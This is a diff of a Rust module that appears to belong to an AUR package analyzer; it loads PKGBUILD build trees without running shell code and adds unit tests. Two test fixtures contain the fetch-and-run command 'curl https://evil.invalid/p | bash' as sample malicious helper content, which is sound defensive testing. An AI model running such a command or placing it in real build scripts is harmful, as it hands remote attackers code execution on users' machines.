@@ -1,4 +1,3 @@
-use std::borrow::Cow;
 use std::collections::HashSet;
 use std::fs;
 use std::io::Read;
@@ -19,18 +18,6 @@ pub struct LocalBuildTree {
     pub install_script_content: Option<String>,
     pub local_source_paths: Vec<String>,
     pub local_source_content: Option<String>,
-}
-
-impl LocalBuildTree {
-    /// PKGBUILD plus bounded local executable helpers, analyzed as one input.
-    pub fn pkgbuild_analysis_content(&self) -> Cow<'_, str> {
-        match &self.local_source_content {
-            Some(local_sources) => {
-                Cow::Owned(format!("{}\n\n{}", self.pkgbuild_content, local_sources))
-            }
-            None => Cow::Borrowed(&self.pkgbuild_content),
-        }
-    }
 }
 
 #[derive(Debug, PartialEq, Eq)]
@@ -95,14 +82,15 @@ struct LocalSourceCandidate {
     must_exist_before_build: bool,
 }
 
-/// Load a Paru build directory without evaluating any shell code.
+/// Load a checked-out AUR build tree without evaluating any shell code.
 ///
-/// `.SRCINFO` supplies the package identities and resolved `install` paths. All
+/// This is the common one-shot entry point for both a helper-provided build
+/// directory and a cached AUR Git checkout. `.SRCINFO` supplies package
+/// identities and makepkg-resolved paths; the PKGBUILD is inspected
+/// independently for stale declarations and executable local helpers. All
 /// files are canonicalized and required to remain inside `build_dir` before
 /// they are read.
-#[cfg(test)]
-#[allow(dead_code)] // Library unit-test helper; the binary's duplicate test build does not call it.
-fn load_build_tree(build_dir: &Path, expected_pkgbase: &str) -> Result<LocalBuildTree, String> {
+pub fn load_build_tree(build_dir: &Path, expected_pkgbase: &str) -> Result<LocalBuildTree, String> {
     let manifest = load_build_manifest(build_dir, expected_pkgbase)?;
     load_build_tree_from_manifest(manifest)
 }
@@ -1639,6 +1627,65 @@ mod tests {
     }
 
     #[test]
+    fn cached_aur_tree_loader_preserves_full_build_tree_analysis() {
+        let dir = TestDir::new("cached-aur-tree");
+        dir.write(
+            "PKGBUILD",
+            r#"pkgbase=demo
+pkgname=(demo-cli demo-docs)
+source=('helper.sh')
+install=shared.install
+package_demo_cli() { install="${pkgname}.install"; }
+"#,
+        );
+        dir.write(
+            ".SRCINFO",
+            "pkgbase = demo\n\tsource = helper.sh\n\npkgname = demo-cli\n\tinstall = demo-cli.install\n\npkgname = demo-docs\n\tinstall = demo-docs.install\n",
+        );
+        dir.write(
+            "demo-cli.install",
+            "post_install() { echo installing-cli; }\n",
+        );
+        dir.write(
+            "demo-docs.install",
+            "post_install() { echo installing-docs; }\n",
+        );
+        dir.write(
+            "shared.install",
+            "post_install() { echo installing-shared; }\n",
+        );
+        dir.write("helper.sh", "curl https://evil.invalid/p | bash\n");
+
+        let tree = load_build_tree(&dir.0, "demo").unwrap();
+
+        assert_eq!(tree.package_names, vec!["demo-cli", "demo-docs"]);
+        assert_eq!(
+            tree.install_script_paths,
+            vec!["demo-cli.install", "demo-docs.install", "shared.install"]
+        );
+        let install_content = tree.install_script_content.as_deref().unwrap();
+        assert!(install_content.contains("installing-cli"));
+        assert!(install_content.contains("installing-docs"));
+        assert!(install_content.contains("installing-shared"));
+        assert_eq!(tree.local_source_paths, vec!["helper.sh"]);
+        assert!(
+            tree.local_source_content
+                .as_deref()
+                .is_some_and(|content| content.contains("evil.invalid/p | bash"))
+        );
+    }
+
+    #[test]
+    fn cached_aur_tree_loader_rejects_an_unreadable_pkgbuild() {
+        let dir = TestDir::new("invalid-pkgbuild-utf8");
+        dir.write_bytes("PKGBUILD", b"pkgname=demo\n\xff\n");
+        dir.write(".SRCINFO", "pkgbase = demo\n\npkgname = demo\n");
+
+        let error = load_build_tree(&dir.0, "demo").unwrap_err();
+        assert!(error.contains("cannot read PKGBUILD"), "{error}");
+    }
+
+    #[test]
     fn loads_split_package_identities_and_install_scripts() {
         let dir = TestDir::new("split");
         dir.write("PKGBUILD", "pkgbase=demo\npkgname=(demo-cli demo-docs)\n");
@@ -1890,7 +1937,7 @@ mod tests {
 
         assert_eq!(tree.install_script_paths, vec!["demo.install"]);
         assert_eq!(tree.local_source_paths, vec!["helper.sh"]);
-        assert!(tree.pkgbuild_analysis_content().contains("echo helper"));
+        assert_eq!(tree.local_source_content.as_deref(), Some("echo helper\n"));
     }
 
     #[test]
@@ -1912,10 +1959,6 @@ mod tests {
         assert_eq!(
             tree.local_source_content.as_deref(),
             Some("curl https://evil.invalid/p | bash\n")
-        );
-        assert!(
-            tree.pkgbuild_analysis_content()
-                .contains("curl https://evil.invalid/p | bash")
         );
     }
 
